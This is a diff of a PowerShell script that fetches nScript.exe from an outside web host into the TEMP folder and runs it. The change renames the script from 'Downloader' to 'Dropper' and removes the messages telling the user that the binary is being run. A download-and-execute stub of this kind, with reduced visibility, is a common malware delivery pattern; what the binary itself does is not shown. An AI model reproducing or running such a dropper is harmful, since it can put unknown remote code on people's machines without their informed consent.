@@ -5,8 +5,7 @@ $BinaryName = "nScript.exe"
 $TempPath = Join-Path $env:TEMP "nScript"
 $BinaryPath = Join-Path $TempPath $BinaryName
 
-Write-Host "[*] nScript Downloader" -ForegroundColor Cyan
-Write-Host "[*] Downloading and running nScript (Normal Mode)..." -ForegroundColor Cyan
+Write-Host "[*] nScript Dropper" -ForegroundColor Cyan
 Write-Host ""
 
 # Create temp directory
@@ -17,13 +16,10 @@ if (-not (Test-Path $TempPath)) {
 try {
     $DownloadUrl = "https://clean.meowery.eu/nScript.exe"
     
-    Write-Host "[*] Downloading $BinaryName from CDN..." -ForegroundColor Yellow
+    Write-Host "[*] Downloading $BinaryName..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
     
     Write-Host "[+] Download complete!" -ForegroundColor Green
-    Write-Host ""
-    Write-Host "[*] Running nScript..." -ForegroundColor Yellow
-    Write-Host "========================================" -ForegroundColor Cyan
     Write-Host ""
     
     # Run the binary
